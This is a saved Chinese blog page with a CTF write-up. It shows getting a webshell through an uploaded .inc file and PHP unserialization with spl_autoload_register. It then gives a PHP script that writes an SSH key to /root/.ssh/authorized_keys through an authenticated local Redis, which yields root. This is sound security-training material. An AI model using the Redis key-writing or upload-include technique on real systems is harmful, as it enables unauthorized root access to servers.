@@ -1,0 +1,400 @@
+
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+<meta content="True" name="HandheldFriendly"/>
+<meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport">
+<meta content="phithon的小站，长期存在与分享关于网络安全与各种编程的原创文章。" name="description"/>
+<meta content="网络安全,代码审计,信息安全,漏洞挖掘,php,C++,mysql,python" name="keywords"/>
+<link href="./『三个白帽』某题的writeup  离别歌/favicon.ico" rel="shortcut icon"/>
+<link href="./『三个白帽』某题的writeup  离别歌/favicon-192x192.png" rel="icon" sizes="192x192" type="image/png"/>
+<link href="./『三个白帽』某题的writeup  离别歌/apple-touch-icon.png" rel="apple-touch-icon" sizes="180x180"/>
+<title>『三个白帽』某题的writeup | 离别歌</title>
+<link href="./『三个白帽』某题的writeup  离别歌/font-awesome.min.css" rel="stylesheet"/>
+<link href="./『三个白帽』某题的writeup  离别歌/styles.css" rel="stylesheet"/>
+<link href="./『三个白帽』某题的writeup  离别歌/style.css" rel="stylesheet"/>
+<link href="./『三个白帽』某题的writeup  离别歌/flexboxgrid.min.css" rel="stylesheet"/>
+<link href="./『三个白帽』某题的writeup  离别歌/feed" rel="alternate" title="离别歌" type="application/atom+xml">
+<script src="./『三个白帽』某题的writeup  离别歌/jquery.min.js"></script>
+<link href="./『三个白帽』某题的writeup  离别歌/code.css" rel="stylesheet"/>
+<link href="./『三个白帽』某题的writeup  离别歌/button.css" rel="stylesheet"/>
+<link href="./『三个白帽』某题的writeup  离别歌/pagination.css" rel="stylesheet"/>
+<link href="./『三个白帽』某题的writeup  离别歌/jquery.fancybox.min.css" rel="stylesheet"/>
+</link></meta></head>
+<body>
+<div id="header-post">
+<a class="active" href="#" id="menu-icon"><i class="fa fa-bars fa-lg"></i></a>
+<a class="active" href="#" id="menu-icon-tablet"><i class="fa fa-bars fa-lg"></i></a>
+<a href="#" id="top-icon-tablet" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+<span id="menu" style="visibility: visible">
+<span id="nav">
+<ul>
+<li><a href="/">主页</a></li>
+<li><a href="javascript:history.back(-1)">返回</a></li>
+</ul>
+</span>
+<br/>
+<span id="actions">
+<ul>
+<li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i aria-hidden="true" class="fa fa-chevron-up" onmouseout="$('#i-top').toggle();" onmouseover="$('#i-top').toggle();"></i></a></li>
+<li><a class="icon" href="#"><i aria-hidden="true" class="fa fa-share-alt" onclick="$('#share').toggle();return false;" onmouseout="$('#i-share').toggle();" onmouseover="$('#i-share').toggle();"></i></a></li>
+</ul>
+<span class="info" id="i-top" style="display:none;">Back to top</span>
+<span class="info" id="i-share" style="display:none;">Share post</span>
+</span>
+<br/>
+<div id="share" style="display: none">
+<ul>
+<li><a class="icon" href="http://www.facebook.com/sharer.php?u=https%3A//www.leavesongs.com/PENETRATION/sangebaimao-2015-11-12-ctf.html"><i aria-hidden="true" class="fa fa-facebook "></i></a></li>
+<li><a class="icon" href="https://twitter.com/share?url=https%3A//www.leavesongs.com/PENETRATION/sangebaimao-2015-11-12-ctf.html&amp;text=%E3%80%8E%E4%B8%89%E4%B8%AA%E7%99%BD%E5%B8%BD%E3%80%8F%E6%9F%90%E9%A2%98%E7%9A%84writeup"><i aria-hidden="true" class="fa fa-twitter "></i></a></li>
+<li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3A//www.leavesongs.com/PENETRATION/sangebaimao-2015-11-12-ctf.html&amp;title=%E3%80%8E%E4%B8%89%E4%B8%AA%E7%99%BD%E5%B8%BD%E3%80%8F%E6%9F%90%E9%A2%98%E7%9A%84writeup"><i aria-hidden="true" class="fa fa-linkedin "></i></a></li>
+<li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3A//www.leavesongs.com/PENETRATION/sangebaimao-2015-11-12-ctf.html&amp;is_video=false&amp;description=%E3%80%8E%E4%B8%89%E4%B8%AA%E7%99%BD%E5%B8%BD%E3%80%8F%E6%9F%90%E9%A2%98%E7%9A%84writeup"><i aria-hidden="true" class="fa fa-pinterest "></i></a></li>
+<li><a class="icon" href="mailto:?subject=%E3%80%8E%E4%B8%89%E4%B8%AA%E7%99%BD%E5%B8%BD%E3%80%8F%E6%9F%90%E9%A2%98%E7%9A%84writeup&amp;body=Check out this article: https%3A//www.leavesongs.com/PENETRATION/sangebaimao-2015-11-12-ctf.html"><i aria-hidden="true" class="fa fa-envelope "></i></a></li>
+<li><a class="icon" href="https://getpocket.com/save?url=https%3A//www.leavesongs.com/PENETRATION/sangebaimao-2015-11-12-ctf.html&amp;title=%E3%80%8E%E4%B8%89%E4%B8%AA%E7%99%BD%E5%B8%BD%E3%80%8F%E6%9F%90%E9%A2%98%E7%9A%84writeup"><i aria-hidden="true" class="fa fa-get-pocket "></i></a></li>
+<li><a class="icon" href="http://reddit.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/sangebaimao-2015-11-12-ctf.html&amp;title=%E3%80%8E%E4%B8%89%E4%B8%AA%E7%99%BD%E5%B8%BD%E3%80%8F%E6%9F%90%E9%A2%98%E7%9A%84writeup"><i aria-hidden="true" class="fa fa-reddit "></i></a></li>
+<li><a class="icon" href="http://www.stumbleupon.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/sangebaimao-2015-11-12-ctf.html&amp;title=%E3%80%8E%E4%B8%89%E4%B8%AA%E7%99%BD%E5%B8%BD%E3%80%8F%E6%9F%90%E9%A2%98%E7%9A%84writeup"><i aria-hidden="true" class="fa fa-stumbleupon "></i></a></li>
+<li><a class="icon" href="http://digg.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/sangebaimao-2015-11-12-ctf.html&amp;title=%E3%80%8E%E4%B8%89%E4%B8%AA%E7%99%BD%E5%B8%BD%E3%80%8F%E6%9F%90%E9%A2%98%E7%9A%84writeup"><i aria-hidden="true" class="fa fa-digg "></i></a></li>
+<li><a class="icon" href="http://www.tumblr.com/share/link?url=https%3A//www.leavesongs.com/PENETRATION/sangebaimao-2015-11-12-ctf.html&amp;name=%E3%80%8E%E4%B8%89%E4%B8%AA%E7%99%BD%E5%B8%BD%E3%80%8F%E6%9F%90%E9%A2%98%E7%9A%84writeup&amp;description="><i aria-hidden="true" class="fa fa-tumblr "></i></a></li>
+</ul>
+</div>
+</span>
+</div>
+<div class="content index width mx-auto px2 my4">
+<article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header>
+<h1 class="posttitle" itemprop="name headline">『三个白帽』某题的writeup</h1>
+<div class="meta">
+<span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+<span itemprop="name">Phithon</span>
+</span>
+<div class="postdate">
+<time datetime="2015年11月13日 00:41" itemprop="datePublished">
+                    2015 十一月 13 00:41
+                </time>
+</div>
+<div class="article-tag">
+            阅读：5282
+            </div>
+<div class="article-tag">
+<i class="fa fa-bookmark"></i>
+<a class="tag-link" href="/sort/PENETRATION">网络安全</a>
+</div>
+<div class="article-tag">
+<i class="fa fa-tag"></i>
+<a class="tag-link" href="/tag/%E4%B8%89%E4%B8%AA%E7%99%BD%E5%B8%BD">三个白帽</a>,
+                
+                <a class="tag-link" href="/tag/ctf">ctf</a>
+</div>
+</div>
+</header>
+<div class="content" itemprop="articleBody">
+<p>先介绍一下三个白帽，三个白帽是一个关于信息安全学习、交流和实践平台，我们以简单、直观、好玩的方式来把信息安全的内容表现出来。我们可以很方便地在三个白帽里创建、启动、关闭linux环境。比如这次CTF，我就是在三个白帽里创建的环境。</p>
+<p>三个白帽地址：<a href="http://www.sangebaimao.com/"><a href="http://www.sangebaimao.com/">http://www.sangebaimao.com/</a></a></p>
+<p>下面是这一题的一些writeup。</p>
+<h2 id="0x01"><a class="toclink" href="#0x01">0x01 找到源码</a></h2>
+<p>目标 <a href="http://24caf446e2bb0e659.jie.sangebaimao.com/"><a href="http://24caf446e2bb0e659.jie.sangebaimao.com/">http://24caf446e2bb0e659.jie.sangebaimao.com/</a></a></p>
+<p>首先扫描发现其包含.git目录，但访问/.git/index发现没有这个文件，可能是被破坏了。 </p>
+<p>用lijiejie的工具无法还原，但用某些工具还是可以办到的，详见我之前的文章：<a href="https://www.leavesongs.com/PENETRATION/XDCTF-2015-WEB2-WRITEUP.html"><a href="https://www.leavesongs.com/PENETRATION/XDCTF-2015-WEB2-WRITEUP.html">https://www.leavesongs.com/PENETRATION/XDCTF-2015-WEB2-WRITEUP.html</a></a> </p>
+<p>就不再赘述，用某工具直接还原源码： </p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201511/29551447346666.png"><img alt="image001.png" src="./『三个白帽』某题的writeup  离别歌/thum-29551447346666.png"/></a></p>
+<p>因为比赛环境已经关闭了，在github分享一下源码： <a href="https://github.com/phith0n/sangebaimao_20151112"><a href="https://github.com/phith0n/sangebaimao_20151112">https://github.com/phith0n/sangebaimao_20151112</a></a></p>
+<h2 id="0x02-getshell"><a class="toclink" href="#0x02-getshell">0x02 getshell</a></h2>
+<p>首先通读源码，发现有几个特点： </p>
+<ol>
+<li>可以上传任意文件，后缀有黑名单检查，文件名是随机字符串md5值 </li>
+<li>数据存储于cookie中，通过php反序列化函数还原并显示 </li>
+</ol>
+<p>其实考察点比较有意思。 </p>
+<p>看到common.inc.php里，包含spl_autoload_register函数，这个函数是自动注册类用的，在当今特别是新型的框架（laravel、composer）中常用。 </p>
+<p>这个函数有个特点，如果不指定处理用的函数，就会自动包含“类名.php”或“类名.inc”的文件，并加载其中的“类名”类。 </p>
+<p>这就比较有意思了，我们之前的黑名单是不包括“.inc”文件的，所以我们可以按照下面方法进行getshell： </p>
+<p>1. 上传webshell，后缀为.inc，被重命名为xxxx.inc </p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201511/25ae1447346667.png"><img alt="image003.png" src="./『三个白帽』某题的writeup  离别歌/thum-25ae1447346667.png"/></a></p>
+<p>2. 序列化一个类名为xxxx的类对象 </p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201511/f3c81447346670.png"><img alt="image005.png" src="./『三个白帽』某题的writeup  离别歌/thum-f3c81447346670.png"/></a></p>
+<p>3. 将序列化以后的字符串作为cookie，发送到服务器上 </p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201511/46071447346672.png"><img alt="image007.png" src="./『三个白帽』某题的writeup  离别歌/thum-46071447346672.png"/></a></p>
+<p>4. 服务器反序列化这个字符串后，将会自动加载xxxx类，由于之前spl_autoload_register函数注册的方法，会自动加载xxxx.inc，从而造成文件包含漏洞，getshell成功 </p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201511/7dfd1447346675.png"><img alt="image009.png" src="./『三个白帽』某题的writeup  离别歌/thum-7dfd1447346675.png"/></a></p>
+<p>在网站根目录的flag-1.php中获得第一个flag。 </p>
+<h2 id="0x03-redis"><a class="toclink" href="#0x03-redis">0x03 利用本地redis提权</a></h2>
+<p>拿到webshell以后，查看一下服务器的一些敏感信息。 </p>
+<p>比如在phpinfo里看到了，session的处理方式用的redis，并且save_path里暴露了redis的端口和密码： </p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201511/e1fb1447346679.png"><img alt="image011.png" src="./『三个白帽』某题的writeup  离别歌/thum-e1fb1447346679.png"/></a></p>
+<p>于是可以利用这段时间比较火的redis写公钥文件进行提权。 </p>
+<p>直接编写一个redis.php，用php来连接redis，执行redis写公钥的POC： </p>
+<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span> 
+<span class="nv">$redis</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Redis</span><span class="p">();</span> 
+<span class="nv">$redis</span><span class="o">-&gt;</span><span class="na">connect</span><span class="p">(</span><span class="s1">'127.0.0.1'</span><span class="p">,</span> <span class="mi">21821</span><span class="p">);</span> 
+<span class="nv">$redis</span><span class="o">-&gt;</span><span class="na">auth</span><span class="p">(</span><span class="s2">"Tat141uIyX8NKU"</span><span class="p">);</span> 
+<span class="nv">$redis</span><span class="o">-&gt;</span><span class="na">flushall</span><span class="p">();</span> 
+<span class="nv">$redis</span><span class="o">-&gt;</span><span class="na">config</span><span class="p">(</span><span class="s2">"SET"</span><span class="p">,</span> <span class="s2">"dir"</span><span class="p">,</span> <span class="s2">"/root/.ssh/"</span><span class="p">);</span> 
+<span class="nv">$redis</span><span class="o">-&gt;</span><span class="na">config</span><span class="p">(</span><span class="s2">"SET"</span><span class="p">,</span> <span class="s2">"dbfilename"</span><span class="p">,</span> <span class="s2">"authorized_keys"</span><span class="p">);</span> 
+<span class="nv">$redis</span><span class="o">-&gt;</span><span class="na">set</span><span class="p">(</span><span class="s2">"0"</span><span class="p">,</span> <span class="s2">"</span><span class="se">\n\n\n</span><span class="s2">ssh-rsa key_pub</span><span class="se">\n\n\n</span><span class="s2">"</span><span class="p">);</span> 
+<span class="nv">$redis</span><span class="o">-&gt;</span><span class="na">save</span><span class="p">();</span>
+</pre></div>
+<p>连接其ssh端口，直接获取root权限。 </p>
+<p>读取/root/flag-2.txt获得第二个flag。</p>
+</div>
+</article>
+<div id="reply-list">
+<h1>评论</h1>
+<div class="row" id="comment-2269">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./『三个白帽』某题的writeup  离别歌/a09e198be5d6b92729b922a9c12e0d71.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">郑州SEO优化</a>
+<time datetime="2015年12月11日 08:38" itemprop="datePublished">
+                            2015 十二月 11 08:38
+                        </time>
+<a href="javascript:reply_to('2269', '郑州SEO优化')">回复</a>
+</p>
+<p class="comment-meta">一直想学习关于这些的，但是不知从何学起</p>
+</div>
+</div>
+<div class="row" id="comment-2267">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./『三个白帽』某题的writeup  离别歌/8e7cf08542fe2c862aff173b9c1c33ee.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://0485.org" target="_blank">xyz軟體</a>
+<time datetime="2015年12月8日 15:10" itemprop="datePublished">
+                            2015 十二月 08 15:10
+                        </time>
+<a href="javascript:reply_to('2267', 'xyz軟體')">回复</a>
+</p>
+<p class="comment-meta">赞哦~~~~~~~</p>
+</div>
+</div>
+<div class="row" id="comment-2266">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./『三个白帽』某题的writeup  离别歌/6e52b9d5acf05d5d6d0dd021b81513c6.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">不锈钢屏风</a>
+<time datetime="2015年12月1日 15:26" itemprop="datePublished">
+                            2015 十二月 01 15:26
+                        </time>
+<a href="javascript:reply_to('2266', '不锈钢屏风')">回复</a>
+</p>
+<p class="comment-meta">支持一下！！！啊哈哈</p>
+</div>
+</div>
+<div class="row" id="comment-2265">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./『三个白帽』某题的writeup  离别歌/6e52b9d5acf05d5d6d0dd021b81513c6.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">中国淋浴房</a>
+<time datetime="2015年12月1日 15:21" itemprop="datePublished">
+                            2015 十二月 01 15:21
+                        </time>
+<a href="javascript:reply_to('2265', '中国淋浴房')">回复</a>
+</p>
+<p class="comment-meta">来啦！</p>
+</div>
+</div>
+<div class="row" id="comment-2259">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./『三个白帽』某题的writeup  离别歌/d41d8cd98f00b204e9800998ecf8427e.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">阿狗</a>
+<time datetime="2015年11月15日 06:02" itemprop="datePublished">
+                            2015 十一月 15 06:02
+                        </time>
+<a href="javascript:reply_to('2259', '阿狗')">回复</a>
+</p>
+<p class="comment-meta">最后一段代码,是第三波里面自带的类吗?</p>
+</div>
+</div>
+<div class="child-node">
+<div class="row" id="comment-2260">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./『三个白帽』某题的writeup  离别歌/c4267eb6d17276fa31c547ac71611e90.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="https://www.leavesongs.com/" target="_blank">phithon</a>
+<time datetime="2015年11月15日 12:12" itemprop="datePublished">
+                            2015 十一月 15 12:12
+                        </time>
+<a href="javascript:reply_to('2260', 'phithon')">回复</a>
+</p>
+<p class="comment-meta">@阿狗：这是php-redis扩展提供的类</p>
+</div>
+</div>
+</div>
+<div class="row" id="comment-2253">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./『三个白帽』某题的writeup  离别歌/722bfbb241383f760cf1085f088c3ccb.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">caomei</a>
+<time datetime="2015年11月13日 10:07" itemprop="datePublished">
+                            2015 十一月 13 10:07
+                        </time>
+<a href="javascript:reply_to('2253', 'caomei')">回复</a>
+</p>
+<p class="comment-meta">为何我下载源码想在搭建起来再玩玩看,直接访问index.php显示500错误 求指点</p>
+</div>
+</div>
+<div class="child-node">
+<div class="row" id="comment-2254">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./『三个白帽』某题的writeup  离别歌/c4267eb6d17276fa31c547ac71611e90.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="https://www.leavesongs.com/" target="_blank">phithon</a>
+<time datetime="2015年11月13日 10:33" itemprop="datePublished">
+                            2015 十一月 13 10:33
+                        </time>
+<a href="javascript:reply_to('2254', 'phithon')">回复</a>
+</p>
+<p class="comment-meta">@caomei：你把前面两句设置不显示错误的语句注释掉，看报什么错。<br>多半是php版本太低。</br></p>
+</div>
+</div>
+<div class="child-node">
+<div class="row" id="comment-2258">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./『三个白帽』某题的writeup  离别歌/722bfbb241383f760cf1085f088c3ccb.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">caomei</a>
+<time datetime="2015年11月13日 14:06" itemprop="datePublished">
+                            2015 十一月 13 14:06
+                        </time>
+<a href="javascript:reply_to('2258', 'caomei')">回复</a>
+</p>
+<p class="comment-meta">@phithon：嗯 我用高版本的PHP搭建一下环境看看</p>
+</div>
+</div>
+</div>
+<div class="row" id="comment-2257">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./『三个白帽』某题的writeup  离别歌/d41d8cd98f00b204e9800998ecf8427e.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">yichin</a>
+<time datetime="2015年11月13日 12:58" itemprop="datePublished">
+                            2015 十一月 13 12:58
+                        </time>
+<a href="javascript:reply_to('2257', 'yichin')">回复</a>
+</p>
+<p class="comment-meta">@caomei：common.inc.php 第5行 $req = []; 低版本php不支持这样的写法</p>
+</div>
+</div>
+</div>
+<div class="row" id="comment-2252">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./『三个白帽』某题的writeup  离别歌/4f7a01baa7d173c6a15269d8d5983ed9.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">neargle</a>
+<time datetime="2015年11月13日 09:09" itemprop="datePublished">
+                            2015 十一月 13 09:09
+                        </time>
+<a href="javascript:reply_to('2252', 'neargle')">回复</a>
+</p>
+<p class="comment-meta">看我今天刷RSS的时候刷出了什么0 0居然是深夜发的- -</p>
+</div>
+</div>
+<div class="row" id="comment-2250">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./『三个白帽』某题的writeup  离别歌/b233774332ee68a8be5d1a9a3e3736fc.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://suibian.xxx" target="_blank">随便</a>
+<time datetime="2015年11月13日 01:49" itemprop="datePublished">
+                            2015 十一月 13 01:49
+                        </time>
+<a href="javascript:reply_to('2250', '随便')">回复</a>
+</p>
+<p class="comment-meta">膜拜。</p>
+</div>
+</div>
+</div>
+<form action="#reply" enctype="multipart/form-data" id="reply" method="post">
+<textarea cols="40" id="id_content" name="content" required="" rows="6">
+</textarea>
+<div class="row">
+<div class="col-xs-4">
+<input id="id_nickname" maxlength="64" name="nickname" placeholder="昵称" required="" type="text"/>
+</div>
+<div class="col-xs-4">
+<input id="id_email" maxlength="254" name="email" placeholder="邮箱（可留空）" type="text"/>
+</div>
+<div class="col-xs-4">
+<input id="id_url" maxlength="200" name="url" placeholder="链接（可留空）" type="text"/>
+</div>
+</div>
+<div class="row" style="margin-top: 8px"><div class="col-xs-4"><input autocomplete="off" id="id_captcha_1" name="captcha_1" placeholder="验证码" type="text"/> <input id="id_captcha_0" name="captcha_0" type="hidden" value="495a5e67cc7e5ac9db73e7422f17ca7826d06b7f"/>
+</div><div class="col-xs-4">
+<img alt="captcha" class="captcha" height="25" src="./『三个白帽』某题的writeup  离别歌/495a5e67cc7e5ac9db73e7422f17ca7826d06b7f"/></div></div>
+<div class="clearfix"></div>
+<input class="ui-button ui-button-sgreen" type="submit" value="提交"/>
+<input id="id_archive" name="archive" type="hidden" value="373">
+<input id="id_parent" name="parent" type="hidden"/>
+<input name="csrfmiddlewaretoken" type="hidden" value="LheXUeJBMcWG1MS23fFsgnQwx6SFBBG4jBztIIVQdZQ51rghRw9cP1SBGalNk5ve"/>
+</input></form>
+</div>
+<footer id="footer">
+<div class="footer-left">
+    Copyright © 2017 Powered by talkbook
+  </div>
+<div class="footer-right">
+<nav>
+<ul>
+<li><a href="/">首页</a></li>
+<li><a href="http://weibo.com/101yx" target="_blank">微博</a></li>
+<li><a href="https://github.com/phith0n" target="_blank">项目</a></li>
+<li><a href="/template/change/">更换模板</a></li>
+</ul>
+</nav>
+</div>
+</footer>
+<script src="./『三个白帽』某题的writeup  离别歌/main.js"></script>
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?ad9ab5e37c2811b9f0979e46123fc898";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+<script src="./『三个白帽』某题的writeup  离别歌/jquery.fancybox.pack.js"></script>
+<script>
+$(document).ready(function () {
+    $("article a").each(function (i, e) {
+        if(e.host != 'www.leavesongs.com') {
+            e.target = '_blank';
+        }
+    });
+    $("article img").each(function (i, e) {
+        if(e.parentNode.tagName.toUpperCase() != 'A') {
+            $(e).wrap('<a href="'+escapeHtml(e.src)+'" class="fancybox"></a>');
+        } else {
+            $(e.parentNode).addClass('fancybox');
+        }
+    });
+    $('.fancybox').fancybox();
+})
+</script>
+</body>
+</html>
